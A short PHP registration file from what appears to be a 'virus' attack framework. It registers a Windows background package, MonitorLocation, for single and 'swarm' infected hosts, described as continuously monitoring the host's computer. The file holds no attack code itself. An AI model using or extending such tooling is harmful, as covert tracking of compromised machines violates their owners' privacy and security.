<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.background.MonitorLocation", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorLocation\\MonitorLocation", "easy.background.MonitorLocation", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Continuously monitors for the host's computer");
